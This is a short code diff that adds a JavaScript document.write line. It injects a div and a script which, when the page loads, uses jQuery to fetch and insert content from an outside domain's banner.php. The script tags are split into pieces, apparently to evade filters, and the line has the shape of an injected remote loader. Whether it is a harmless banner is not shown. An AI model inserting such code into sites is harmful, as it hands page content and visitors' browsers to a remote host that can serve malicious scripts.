@@ -1,0 +1,2 @@
+
+document.write("<div id=\"hiadone_pageid\"></div><scr"+"ipt type=\"text/javascr"+"ipt\">$(document).ready(function() {$('#hiadone_pageid').load('http://newdealpopcon.com/banner.php');});</scr"+"ipt>")
